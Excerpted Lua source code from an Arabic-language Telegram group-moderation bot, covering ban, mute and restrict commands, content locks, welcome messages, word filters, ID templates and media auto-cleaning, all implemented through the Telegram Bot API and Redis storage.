Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الحظر العام ↫ '..banall..'\n᥀︙الكتم العام ↫ '..muteall..'\n᥀︙الحظر ↫ '..banned..'\n᥀︙الكتم ↫ '..muted..'\n᥀︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Matrx..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Matrx..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Matrx..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Matrx..'Rio:BanAll:',result.sender_user_id_) DevRio:srem(Matrx..'Rio:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Matrx..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Matrx..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Matrx..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Matrx..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(Matrx..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(Matrx..'Rio:Muted:'..msg.chat_id_,user) DevRio:srem(Matrx..'Rio:BanAll:',user) DevRio:srem(Matrx..'Rio:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Matrx..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(Matrx..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(Matrx..'Rio:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Matrx..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(Matrx..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(Matrx..'Rio:Muted:'..msg.chat_id_,result.id_) DevRio:srem(Matrx..'Rio:BanAll:',result.id_) DevRio:srem(Matrx..'Rio:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Matrx..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(Matrx..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(Matrx..'Rio:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
...
DevRio:set(Matrx.."Rio:GpIds:Text"..msg.chat_id_,Text_Rand)
...
DevRio:set("Matrx:New:id:"..Matrx..msg.sender_user_id_,'MatrxTeam')
return "MatrxTeam"
end
if text and DevRio:get("Matrx:New:id:"..Matrx..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevRio:del("Matrx:New:id:"..Matrx..msg.sender_user_id_)
return false
end
DevRio:del("Matrx:New:id:"..Matrx..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevRio:set(Matrx.."Rio:AllIds:Text",text)
return false
end
...
DevRio:del(Matrx.."Rio:AllIds:Text")
end
end
--     Source Matrx     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙رجائا اتبع التعليمات للتعيين \n᥀︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
DevRio:set("Matrx:New:id:"..Matrx..msg.chat_id_..msg.sender_user_id_,'MatrxTeam')
return "MatrxTeam"
end
if text and Manager(msg) and DevRio:get("Matrx:New:id:"..Matrx..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevRio:del("Matrx:New:id:"..Matrx..msg.chat_id_..msg.sender_user_id_)
return false
end
DevRio:del("Matrx:New:id:"..Matrx..msg.chat_id_..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الكليشه الجديده', 1, 'md')
DevRio:set(Matrx.."Rio:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف كليشة الايدي")  
DevRio:del(Matrx.."Rio:GpIds:Text"..msg.chat_id_)
end
end
--     Source Matrx     --
if msg.reply_to_message_id_ ~= 0 then
...
function MatrxTeam(extra,rio,success)
...
local msgsday = DevRio:get(Matrx..'Rio:UsersMsgs'..Matrx..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevRio:get(Matrx..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevRio:get(Matrx..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevRio:get(Matrx..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
...
if not DevRio:get(Matrx..'Rio:Lock:Id'..msg.chat_id_) then 
if not DevRio:get(Matrx..'Rio:Lock:Id:Photo'..msg.chat_id_) then 
if DevRio:get(Matrx.."Rio:AllIds:Text") then
newpicid = DevRio:get(Matrx.."Rio:AllIds:Text")
...
if not DevRio:get(Matrx.."Rio:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, rio.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevRio:get(Matrx.."Rio:GpIds:Text"..msg.chat_id_)
...
if DevRio:get(Matrx.."Rio:AllIds:Text") then
newallid = DevRio:get(Matrx.."Rio:AllIds:Text")
...
if DevRio:get(Matrx.."Rio:AllIds:Text") then
notpicid = DevRio:get(Matrx.."Rio:AllIds:Text")
...
if not DevRio:get(Matrx..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التعديل")  
DevRio:set(Matrx..'Rio:Lock:EditMsgs'..msg.chat_id_,true)
else
...
DevRio:set(Matrx.."Rio:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevRio:hset(Matrx.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevRio:hset(Matrx.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
...
DevRio:hset(Matrx.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevRio:hset(Matrx.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevRio:get(Matrx..'Rio:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevRio:set(Matrx.."Rio:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التثبيت")  
DevRio:set(Matrx..'Rio:Lock:Pin'..msg.chat_id_,true)
DevRio:sadd(Matrx.."Rio:Lock:Pinpin",msg.chat_id_) 
else
...
DevRio:hset(Matrx.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevRio:hset(Matrx.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevRio:get(Matrx..'Rio:Lock:Id:Photo'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بالصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:Id:Photo'..msg.chat_id_,true)
end end 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevRio:get(Matrx..'Rio:Lock:Id'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالتاكيد معطل ', 1, 'md')
else
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source Matrx     --
...
DevRio:setex(Matrx.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevRio:get(Matrx.."Rio:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevRio:set(Matrx.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx.."Rio:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الترحيب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx.."Rio:Lock:Welcome"..msg.chat_id_)
end
if DevRio:get(Matrx..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevRio:del(Matrx..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Matrx..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevRio:set(Matrx..'Rio:Groups:Welcomes'..msg.chat_id_,Welcomes)
...
DevRio:set(Matrx..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الترحيب")  
DevRio:del(Matrx..'Rio:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevRio:get(Matrx..'Rio:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
...
--     Source Matrx     --
if DevRio:get(Matrx..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء حفظ الوصف", 1, 'md')
DevRio:del(Matrx..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Matrx..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevRio:set(Matrx..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
DevRio:set(Matrx.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevRio:get(Matrx.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر المنع', 1, 'md')
DevRio:del(Matrx.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم منع الكلمه ↫ "..text, 1, 'html')
DevRio:del(Matrx.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevRio:hset(Matrx..'Rio:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الكلمه الان", 1, 'md') 
DevRio:set(Matrx.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevRio:get(Matrx.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الغاء المنع', 1, 'md')
DevRio:del(Matrx.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevRio:hget(Matrx..'Rio:Filters:'..msg.chat_id_, text) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevRio:del(Matrx.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevRio:hdel(Matrx..'Rio:Filters:'..msg.chat_id_, text)
...
local gps = DevRio:scard(Matrx.."Rio:Groups") local users = DevRio:scard(Matrx.."Rio:Users") 
...
local users = DevRio:scard(Matrx.."Rio:Users")
...
local gps = DevRio:scard(Matrx.."Rio:Groups")
...
if not DevRio:get(Matrx..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
...
DevRio:setex(Matrx..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
...
local pv = DevRio:smembers(Matrx.."Rio:Users")
local sendok = 0
for i = 1, #pv do
...
DevRio:srem(Matrx.."Rio:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
...
local group = DevRio:smembers(Matrx.."Rio:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevRio:srem(Matrx.."Rio:Groups",group[i]) 
...
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙عدد الكروبات الان ↫ { '..#group..' }'..Matrxgp1..Matrxgp2..'\n᥀︙العدد الحقيقي الان  ↫ ( '..Matrxgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:CleanNum'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:CleanNum'..msg.chat_id_) 
end
...
DevRio:set(Matrx..'Rio:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevRio:get(Matrx..'Rio:Lock:CleanNum'..msg.chat_id_) then
if DevRio:get(Matrx..'Rio:CleanNum'..msg.chat_id_) then CleanNum = DevRio:get(Matrx..'Rio:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevRio:scard(Matrx.."Rio:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevRio:smembers(Matrx.."Rio:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevRio:del(Matrx.."Rio:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevRio:get(Matrx..'Rio:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevRio:scard(Matrx.."Rio:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد الميديا ↫ "..M.."\n᥀︙الحذف التلقائي ↫ "..(DevRio:get(Matrx..'Rio:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevRio:get(Matrx..'Rio:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevRio:scard(Matrx.."Rio:cleaner"..msg.chat_id_)
if M ~= 0 then
...
DevRio:del(Matrx.."Rio:cleaner"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل مسح الاغاني بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevRio:get(Matrx..'Rio:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevRio:scard(Matrx.."Rio:cleanermusic"..msg.chat_id_)
if M ~= 0 then
...
local List = DevRio:smembers(Matrx.."Rio:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevRio:del(Matrx.."Rio:cleanermusic"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
--     Source Matrx     --
...
if DevRio:get(Matrx..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التعديل")  
DevRio:del(Matrx..'Rio:Lock:EditMsgs'..msg.chat_id_)
else
...
DevRio:del(Matrx.."Rio:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevRio:hdel(Matrx.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevRio:get(Matrx..'Rio:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التثبيت")  
DevRio:del(Matrx..'Rio:Lock:Pin'..msg.chat_id_)
DevRio:srem(Matrx.."Rio:Lock:Pinpin",msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Text'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Photo'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevRio:get(Matrx..'Rio:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الكلايش")  
DevRio:del(Matrx..'Rio:Lock:Spam'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Join'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Videos'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Document'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Inline'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Markdown'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Gifs'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Music'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Voice'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Links'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Location'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Tags'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Hashtak'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Contact'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:WebLinks'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Arabic'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:English'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:TagServr'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Stickers'..msg.chat_id_)
else
...
DevRio:del(Matrx..'Rio:Lock:Forwards'..msg.chat_id_)
else
...
DevRio:set(Matrx.."Rio:Lock:Bots"..msg.chat_id_,"del") DevRio:hset(Matrx.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevRio:set(Matrx..Lock..msg.chat_id_,true)
end
...
DevRio:del(Matrx..UnLock..msg.chat_id_)
end
...
DevRio:del(Matrx..'Rio:Lock:Fshar'..msg.chat_id_) DevRio:del(Matrx..'Rio:Lock:Taf'..msg.chat_id_) DevRio:del(Matrx..'Rio:Lock:Kfr'..msg.chat_id_) 
DevRio:set(Matrx.."Rio:Lock:Bots"..msg.chat_id_,"del") DevRio:hset(Matrx.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
...
DevRio:set(Matrx..'Rio:Lock:Fshar'..msg.chat_id_,true) DevRio:set(Matrx..'Rio:Lock:Taf'..msg.chat_id_,true) DevRio:set(Matrx..'Rio:Lock:Kfr'..msg.chat_id_,true) DevRio:hdel(Matrx.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
...
DevRio:set(Matrx..'Rio:Spam:Text'..msg.chat_id_,SetSpam)
...
DevRio:set(Matrx.."Rio:SudoBot:Rd"..msg.chat_id_,Text)
...
DevRio:set(Matrx.."Rio:BasicConstructor:Rd"..msg.chat_id_,Text)
...
DevRio:set(Matrx.."Rio:Constructor:Rd"..msg.chat_id_,Text)
...
DevRio:set(Matrx.."Rio:Managers:Rd"..msg.chat_id_,Text) 
...
DevRio:set(Matrx.."Rio:Admins:Rd"..msg.chat_id_,Text)
...
DevRio:set(Matrx.."Rio:VipMem:Rd"..msg.chat_id_,Text)
...
DevRio:set(Matrx.."Rio:Cleaner:Rd"..msg.chat_id_,Text)
...
DevRio:set(Matrx.."Rio:mem:Rd"..msg.chat_id_,Text)
...
DevRio:del(Matrx.."Rio:mem:Rd"..msg.chat_id_)
DevRio:del(Matrx.."Rio:Cleaner:Rd"..msg.chat_id_)
DevRio:del(Matrx.."Rio:VipMem:Rd"..msg.chat_id_)
DevRio:del(Matrx.."Rio:Admins:Rd"..msg.chat_id_)
DevRio:del(Matrx.."Rio:Managers:Rd"..msg.chat_id_)
DevRio:del(Matrx.."Rio:Constructor:Rd"..msg.chat_id_)
DevRio:del(Matrx.."Rio:BasicConstructor:Rd"..msg.chat_id_)
DevRio:del(Matrx.."Rio:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source Matrx     --
...
DevRio:del(Matrx..'Rio:SudoBotGp:'..msg.chat_id_)
end
end
if RioSudoGp(msg) then
...
DevRio:del(Matrx..'Rio:SecondSudoGp:'..msg.chat_id_)
end
end
if RioSudo(msg) then
...
DevRio:del(Matrx..'Rio:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المنشئين")  
DevRio:del(Matrx..'Rio:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المدراء")  
DevRio:del(Matrx..'Rio:Managers:'..msg.chat_id_)
end 
...
DevRio:srem(Matrx..'Rio:Tkeed:'..msg.chat_id_, v)
end 
...
DevRio:del(Matrx..'Rio:Filters:'..msg.chat_id_)
DevRio:del(Matrx.."Rio:FilterAnimation"..msg.chat_id_)
DevRio:del(Matrx.."Rio:FilterPhoto"..msg.chat_id_)
DevRio:del(Matrx.."Rio:FilterSteckr"..msg.chat_id_)
end
...
